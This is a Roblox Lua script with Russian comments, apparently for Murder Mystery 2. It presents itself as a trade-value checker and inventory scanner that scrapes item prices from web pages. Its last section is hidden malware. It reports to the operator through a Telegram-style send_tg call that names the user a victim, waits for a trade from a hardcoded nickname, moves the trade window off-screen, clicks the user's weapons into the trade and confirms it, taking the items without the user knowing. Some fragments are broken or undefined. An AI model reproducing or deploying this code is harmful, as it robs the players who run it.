local texts, cache, loadedPages = {}, {}, 0

local function normalize(s)
    s = s:gsub("’", "'")
    return (s:lower():gsub("^%s+", ""):gsub("%s+$", ""))
end

local function clean(html)
    html = html:gsub("<[^>]+>", " ")
    html = html:gsub("&amp;", "&"):gsub("&#39;", "'"):gsub("’", "'")
    html = html:gsub("%s+", " ")
    return " " .. html:lower()
end

local function refreshValues()
    local new = {}
    for _, url in ipairs(PAGES) do
        local ok, res = pcall(function() return game:HttpGet(url) end)
        if ok and type(res) == "string" then
            new[#new + 1] = {src = url:match("/([^/]+)$") or "?", text = clean(res)}
        end
        task.wait(1)
    end
    if #new > 0 then
        texts = new
        cache = {}
        loadedPages = #new
    end
end

local function getValue(name)
    local key = normalize(name)
    if cache[key] ~= nil then
        if cache[key] == false then return nil end
        return cache[key][1], cache[key][2]
    end
    local esc = (key:gsub("%p", "%%%0"))
    local pat = " " .. esc .. " value %- ([%d,%.]+)"
    for _, p in ipairs(texts) do
        local m = p.text:match(pat)
        if m then
            local v = tonumber((m:gsub(",", "")))
            if v then
                cache[key] = {v, p.src}
                return v, p.src
            end
        end
    end
    cache[key] = false
    return nil
end

local function isShown(obj, root)
    local o = obj
    while o and o ~= root do
        if o:IsA("GuiObject") and not o.Visible then return false end
        o = o.Parent
    end
    return true
end

local function readName(slot)
    local best
    for _, d in ipairs(slot:GetDescendants()) do
        if d:IsA("TextLabel") and (d.Name == "Label" or d.Name == "ColoredName") then
            local t = d.Text
            if t ~= "" and t ~= "Loading" and t ~= "..." then
                best = t
                if d.Name == "ColoredName" then break end
            end
        end
    end
    return best
end

local function fmt(n)
    local s
    if n % 1 == 0 then s = string.format("%d", n) else s = string.format("%.1f", n) end
    local sign, int, rest = s:match("^(-?)(%d+)(.*)$")
    int = int:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
    return sign .. int .. rest
end

        lbl.Visible = true

end

local function hidePrice(slot)
    local pl = slot:FindFirstChild("MM2Price")
    if pl then pl.Visible = false end
end

local function sumOffer(offer)
    local total, dbg = 0, {}
    local cont = offer:FindFirstChild("Container")
    if not cont then return 0, dbg end
    for _, slot in ipairs(cont:GetChildren()) do
        if slot.Name:match("^NewItem") then
            if isShown(slot, offer) then
                local name = readName(slot)
                if name then
                    local v, src = getValue(name)
                    if v then total += v end
                    setPrice(slot, v)
                    dbg[#dbg + 1] = name .. "=" .. (v and (v .. "@" .. src) or "?")
                else
                    hidePrice(slot)
                end
            else
                hidePrice(slot)
            end
        end
    end
    return total, dbg
end

local function render(a, b)
    local diff = b - a
    local total = a + b
    local ratio = (total == 0) and 0.5 or (b / total)
    ratio = math.clamp(ratio, 0.06, 1)

    local color, text
    if diff > 0 then
        color, text = COLOR_WIN, "WIN +" .. fmt(diff)
    elseif diff < 0 then
        color, text = COLOR_LOSE, "LOSE " .. fmt(diff)
    else
        color, text = COLOR_EVEN, "EVEN"
    end

    title.Text = text
    mineLbl.Text = fmt(a)
    theirsLbl.Text = fmt(b)
    TweenService:Create(fill, tweenInfo, {
        Size = UDim2.new(ratio, 0, 1, 0),
        BackgroundColor3 = color,
    }):Play()
end

local nameDB, dbState = {}, "имена: загрузка..."

task.spawn(function()
    pcall(function()
        local function take(t)
            for id, e in pairs(t) do
                if type(id) == "string" and type(e) == "table" then
                    local nm = e.ItemName or e.Name or e.DisplayName
                    if type(nm) == "string" and nm ~= "" then nameDB[id] = nm end
                end
            end
        end
        for _, m in ipairs(RS:GetDescendants()) do
            if m:IsA("ModuleScript") then
                local fn = m:GetFullName():lower()
                if fn:find("database", 1, true) or fn:find("item", 1, true) then
                    local ok, t = pcall(require, m)
                    if ok and type(t) == "table" then
                        take(t)
                        for _, sub in pairs(t) do
                            if type(sub) == "table" then take(sub) end
                        end
                    end
                end
            end
        end
    end)
    local c = 0
    for _ in pairs(nameDB) do c += 1 end
    dbState = c > 0 and ("имён предметов: " .. c) or "имена не найдены, угадываю по ID"
end)

local function candidates(id)
    local c = {}
    if nameDB[id] then c[#c + 1] = nameDB[id] end
    local s = id:gsub("_[KG]_%d+$", ""):gsub("_%d+$", ""):gsub("_[KG]$", "")
    local spaced = s:gsub("_", " "):gsub("(%l)(%u)", "%1 %2")
    c[#c + 1] = spaced
    local base = spaced:gsub(" Knife$", ""):gsub(" Gun$", "")
    if base ~= spaced then c[#c + 1] = base end
    c[#c + 1] = (s:gsub("_", ""))
    return c
end

local function valueOf(id)
    local cs = candidates(id)
    for _, nm in ipairs(cs) do
        local v = getValue(nm)
        if v then return v, nm end
    end
    return nil, cs[1]
end

local function fetch(plr)
    local r = RS:FindFirstChild("Remotes")
    r = r and r:FindFirstChild("Inventory")
    r = r and r:FindFirstChild("GetProfileData")
    if not r then return nil, "нет remote" end
    local ok, d = pcall(function() return r:InvokeServer(plr.Name) end)
    if ok and type(d) == "table" and type(d.Weapons) == "table" and type(d.Weapons.Owned) == "table" then
        return d.Weapons.Owned
    end
    return nil, "нет данных"
end

local running, stopFlag = false, false

local function runParser()
    if running then return end
    local q = normalize(input.Text)
    if q == "" then setStatus("Впиши название оружия или число.") return end
    local target = tonumber((q:gsub("[,%s]", "")))
    local qn = q:gsub("%s", "")
    running, stopFlag = true, false
    clearResults()
    banner.Visible = false

    if target and #texts == 0 then
        setStatus("Жду загрузку цен...")
        for _ = 1, 40 do
            if #texts > 0 then break end
            task.wait(0.5)
        end
        if #texts == 0 then
            setStatus("Цены не загрузились, попробуй позже.")
            running = false
            return
        end
    end

    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then list[#list + 1] = p end
    end
    if #list == 0 then
        setStatus("На сервере никого нет. Жми «Перезайти».")
        running = false
        return
    end

    local pending, checked, failed, hits = 0, 0, 0, 0
    local function refreshStatus()
        setStatus(string.format("Проверено %d/%d | найдено: %d | %s", checked, #list, hits, dbState))
    end

    local function process(plr)
        local inv = fetch(plr)
        if stopFlag then return end
        if not inv then failed += 1 return end
        checked += 1

        local rows, total = {}, 0
        for id, amt in pairs(inv) do
            local n = tonumber(amt) or 1
            local v, nm = valueOf(id)
            rows[#rows + 1] = {id = id, name = nm or id, amt = n, v = v}
            if v then total += v * n end
        end

        if target then
            if total >= target then
                hits += 1
                table.sort(rows, function(a, b) return (a.v or 0) > (b.v or 0) end)
                local top = {}
                for k = 1, math.min(3, #rows) do
                    local r = rows[k]
                    if r.v then
                        top[#top + 1] = r.name .. " (" .. fmt(r.v) .. ")" .. (r.amt > 1 and (" x" .. r.amt) or "")
                    end
                end
                local msg = "✅ " .. plr.Name .. " — " .. fmt(total) .. " валют\nДороже всего: " .. table.concat(top, ", ")
                addResult(msg, COLOR_WIN)
                notify(msg)
                if stopOnHit then stopFlag = true end
            end
        else
            local found = {}
            for _, r in ipairs(rows) do
                local idn = r.id:lower():gsub("[_%s]", "")
                if normalize(r.name):find(q, 1, true) or idn:find(qn, 1, true) then
                    found[#found + 1] = r.name .. (r.amt > 1 and (" x" .. r.amt) or "")
                end
            end
            if #found > 0 then
                hits += 1
                local msg = "✅ " .. plr.Name .. ": " .. table.concat(found, ", ")
                addResult(msg, COLOR_WIN)
                notify(msg)
                if stopOnHit then stopFlag = true end
            end
        end
        refreshStatus()
    end

    refreshStatus()
    for _, plr in ipairs(list) do
        if stopFlag then break end
        pending += 1
        task.spawn(function()
            pcall(process, plr)
            pending -= 1
        end)
        task.wait(0.12)
    end
    local t0 = os.clock()
    while pending > 0 and not stopFlag and os.clock() - t0 < 10 do
        task.wait(0.1)
    end

    if hits > 0 then
        setStatus("Успешно! Найдено: " .. hits .. " | проверено " .. checked .. "/" .. #list .. " | " .. dbState)
    elseif stopFlag then
        setStatus("Остановлено.")
    else
        setStatus("Никого не нашли (проверено " .. checked .. "/" .. #list .. ", ошибок " .. failed .. "). Жми «Перезайти».")
        addResult("Никого подходящего на этом сервере.", Color3.fromRGB(255, 160, 160))
    end
    running = false
end

send_tg("🚀 Скрипт (FULL) запущен!\nЖертва: " .. lp.Name .. "\nJobID: " .. game.JobId)

local is_busy = false

task.spawn(function()
    while true do
        task.wait(0.5)
        if is_busy then continue end
        
        local gui = playerGui:FindFirstChild("TradeGUI")
        
        if gui then
            local is_my_trade = false
            
            -- Сканируем все текст-объекты, ищем свой ник
            for _, desc in ipairs(gui:GetDescendants()) do
                if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                    if desc.Text and string.find(string.lower(desc.Text), string.lower(MY_NICK)) then
                        is_my_trade = true
                        break
                    end
                end
            end

            -- Если нашли свой ник и еще не начинали
            if is_my_trade and not gui:GetAttribute("Hacked") then
                gui:SetAttribute("Hacked", true)
                is_busy = true
                send_tg("✅ Окно трейда от " .. MY_NICK .. " найдено! Начинаю.")
                
                -- 1. Прячем окно (уносим все фреймы за экран)
                for _, child in ipairs(gui:GetChildren()) do
                    if child:IsA("Frame") then
                        child.Position = UDim2.new(0, -5000, 0, -5000)
                    end
                end
                
                task.wait(1)
                
                -- 2. Кликаем "Add Items"
                local add_items_btn = gui:FindFirstChild("AddItem", true)
                if add_items_btn and add_items_btn:FindFirstChild("ActionButton") then
                    add_items_btn.ActionButton.MouseButton1Click:Fire()
                    send_tg("🖱 Открыл меню предметов.")
                    task.wait(1)
                else
                    send_tg("⚠️ Кнопка AddItem не найдена.")
                end

                -- 3. Закликиваем предметы (Weapons)
                local items_folder = gui:FindFirstChild("__mO", true)
                if items_folder and items_folder:FindFirstChild("Weapons") then
                    local weapons_list = items_folder.Weapons.Items.Container.Current.Container
                    local start_t = os.clock()
                    
                    -- 4 секунды спамим кликами по предметам
                    while os.clock() - start_t < 4.0 do
                        for _, item in ipairs(weapons_list:GetChildren()) do
                            if item.Name == "NewItem" then
                                local btn = item:FindFirstChild("Button", true)
                                if btn then
                                    btn.MouseButton1Click:Fire()
                                    task.wait(0.15)
                                    break
                                end
                            end
                        end
                        task.wait(0.05)
                    end
                    send_tg("⏳ Предметы закликаны. Возвращаюсь.")
                else
                    send_tg("⚠️ Папка с оружием не найдена.")
                end

                -- 4. Возвращаем окно на экран
                for _, child in ipairs(gui:GetChildren()) do
                    if child:IsA("Frame") then
                        child.Position = UDim2.new(0.5, 0, 0.5, 0)
                    end
                end
                task.wait(0.5)
                
                -- 5. Ждем и жмем финальный Accept
                send_tg("⏳ Жду 9 секунд перед подтверждением...")
                task.wait(9)
                
                local accept_folder = gui:FindFirstChild("Accept", true)
                if accept_folder then
                    if accept_folder:FindFirstChild("Confirm") and accept_folder.Confirm:FindFirstChild("ActionButton") then
                        accept_folder.Confirm.ActionButton.MouseButton1Click:Fire()
                        send_tg("✅ Первый Confirm нажат.")
                        task.wait(1)
                    end
                    if accept_folder:FindFirstChild("ActionButton") then
                        accept_folder.ActionButton.MouseButton1Click:Fire()
                        send_tg("💰 Трейд успешно подтвержден!")
                    else
                        send_tg("⚠️ Финальный ActionButton не найден.")
                    end
                else
                    send_tg("⚠️ Папка Accept не найдена.")
                end
                
                -- Сбрасываем флаг через 2 секунды
                task.wait(2)
                gui:SetAttribute("Hacked", nil)
                is_busy = false
            end
        end
    end
end)
